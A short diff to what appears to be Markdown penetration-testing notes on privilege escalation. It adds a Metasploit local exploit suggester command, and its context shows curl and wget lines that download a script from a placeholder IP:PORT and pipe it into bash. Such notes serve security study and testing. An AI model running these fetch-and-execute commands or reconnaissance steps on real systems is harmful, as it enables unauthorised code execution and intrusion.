@@ -25,6 +25,12 @@ curl IP:PORT/scrip.sh | bash
 wget -O - IP:PORT/scrip.sh | bash
 ```
 
+There is a Metasploit module that can be used to determine potential exploit on the target server.
+
+```bash
+msf > use post/multi/recon/local_exploit_suggestor
+```
+
 *Note that I didn't include "unix-privesc-check" has it has not been updated since 3 years*
 
 #### Distribution
